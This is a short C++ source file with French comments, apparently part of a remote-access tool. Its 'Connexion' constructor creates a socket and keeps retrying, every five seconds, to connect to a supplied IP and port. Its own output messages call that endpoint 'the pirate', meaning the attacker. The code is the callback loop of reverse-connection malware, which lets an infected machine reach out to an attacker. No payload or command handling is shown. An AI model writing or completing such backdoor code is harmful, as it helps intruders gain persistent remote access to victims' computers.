//
// Created by Berlingot on 2023-04-20.
//

#include<dos.h>   //for delay()
#include <unistd.h>
#include "Connexion.h"



Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
    connexiontype = ConnexionTypearg;

    //Démarrage des services necessaires
    if(MyPNet::Network::Initialize()){
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) {
                if (socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) {
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);}
            }
        }
    }
}

